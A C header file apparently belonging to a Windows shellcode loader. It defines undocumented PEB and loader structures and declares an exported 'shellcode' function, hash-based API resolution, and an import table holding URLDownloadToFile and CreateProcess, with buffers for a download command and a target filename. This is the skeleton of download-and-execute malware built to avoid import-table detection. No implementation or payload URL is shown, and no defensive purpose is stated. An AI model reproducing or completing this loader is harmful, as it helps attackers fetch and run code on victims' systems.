#pragma once

#include <stddef.h>
#include <stdint.h>
#include <windows.h>
#include <winternl.h>

typedef PVOID PACTIVATION_CONTEXT;

typedef struct _LDR_DATA_TABLE_ENTRY_EX {
	LIST_ENTRY InLoadOrderLinks;
	LIST_ENTRY InMemoryOrderLinks;
	LIST_ENTRY InInitializationOrderLinks;
	PVOID DllBase;
	PVOID EntryPoint;
	ULONG SizeOfImage;
	UNICODE_STRING FullDllName;
	UNICODE_STRING BaseDllName;
	ULONG Flags;
	WORD LoadCount;
	WORD TlsIndex;
	union {
		LIST_ENTRY HashLinks;
		struct {
			PVOID SectionPointer;
			ULONG CheckSum;
		};
	};
	union {
		ULONG TimeDateStamp;
		PVOID LoadedImports;
	};
	PACTIVATION_CONTEXT EntryPointActivationContext;
	PVOID PatchInformation;
	LIST_ENTRY ForwarderLinks;
	LIST_ENTRY ServiceTagLinks;
	LIST_ENTRY StaticLinks;
} LDR_DATA_TABLE_ENTRY_EX, * PLDR_DATA_TABLE_ENTRY_EX;

typedef struct _PEB_LDR_DATA_EX {
   ULONG                   Length;
   ULONG                   Initialized;
   PVOID                   SsHandle;
   LIST_ENTRY              InLoadOrderModuleList;
   LIST_ENTRY              InMemoryOrderModuleList;
   LIST_ENTRY              InInitializationOrderModuleList;
} PEB_LDR_DATA_EX, * PPEB_LDR_DATA_EX;

typedef struct _PEB_EX {
	BOOLEAN                 InheritedAddressSpace;
	BOOLEAN                 ReadImageFileExecOptions;
	BOOLEAN                 BeingDebugged;
	BOOLEAN                 Spare;
	HANDLE                  Mutant;
	PVOID                   ImageBase;
	PPEB_LDR_DATA_EX        LoaderData;
	PVOID                   ProcessParameters;
	PVOID                   SubSystemData;
	PVOID                   ProcessHeap;
	PVOID                   FastPebLock;
	PVOID                   FastPebLockRoutine;
	PVOID                   FastPebUnlockRoutine;
	ULONG                   EnvironmentUpdateCount;
	PVOID* KernelCallbackTable;
	PVOID                   EventLogSection;
	PVOID                   EventLog;
	PVOID                   FreeList;
	ULONG                   TlsExpansionCounter;
	PVOID                   TlsBitmap;
	ULONG                   TlsBitmapBits[0x2];
	PVOID                   ReadOnlySharedMemoryBase;
	PVOID                   ReadOnlySharedMemoryHeap;
	PVOID* ReadOnlyStaticServerData;
	PVOID                   AnsiCodePageData;
	PVOID                   OemCodePageData;
	PVOID                   UnicodeCaseTableData;
	ULONG                   NumberOfProcessors;
	ULONG                   NtGlobalFlag;
	BYTE                    Spare2[0x4];
	LARGE_INTEGER           CriticalSectionTimeout;
	ULONG                   HeapSegmentReserve;
	ULONG                   HeapSegmentCommit;
	ULONG                   HeapDeCommitTotalFreeThreshold;
	ULONG                   HeapDeCommitFreeBlockThreshold;
	ULONG                   NumberOfHeaps;
	ULONG                   MaximumNumberOfHeaps;
	PVOID** ProcessHeaps;
	PVOID                   GdiSharedHandleTable;
	PVOID                   ProcessStarterHelper;
	PVOID                   GdiDCAttributeList;
	PVOID                   LoaderLock;
	ULONG                   OSMajorVersion;
	ULONG                   OSMinorVersion;
	ULONG                   OSBuildNumber;
	ULONG                   OSPlatformId;
	ULONG                   ImageSubSystem;
	ULONG                   ImageSubSystemMajorVersion;
	ULONG                   ImageSubSystemMinorVersion;
	ULONG                   GdiHandleBuffer[0x22];
	ULONG                   PostProcessInitRoutine;
	ULONG                   TlsExpansionBitmap;
	BYTE                    TlsExpansionBitmapBits[0x80];
	ULONG                   SessionId;
} PEB_EX, * PPEB_EX;

typedef struct __IAT {
   PPEB_EX peb;
   uint8_t * (WINAPI *LoadLibrary)(LPCSTR);
   BOOL (WINAPI *CreateProcess)(LPCSTR, LPSTR, LPSECURITY_ATTRIBUTES, LPSECURITY_ATTRIBUTES, BOOL, DWORD, LPVOID, LPCSTR, LPSTARTUPINFOA, LPPROCESS_INFORMATION);
   HRESULT (WINAPI *URLDownloadToFile)(LPUNKNOWN, LPCSTR, LPCSTR, DWORD, LPBINDSTATUSCALLBACK);
} IAT;

IAT IMPORT_TABLE;
char TARGET_FILENAME[];
char DOWNLOAD_COMMAND[];
   
__declspec(dllexport) int shellcode(LPVOID arg);
IAT *iat(void);
uint8_t *get_import_by_hash(uint8_t *module, uint32_t hash);
char *target_filename(void);
char *download_command(void);
uint32_t fnv321a(const char *str);
size_t strlen_local(const char *str);
void memcpy_local(void *dest, const void *src, size_t size);
void *memset(void *dest, uint8_t value, size_t size); 
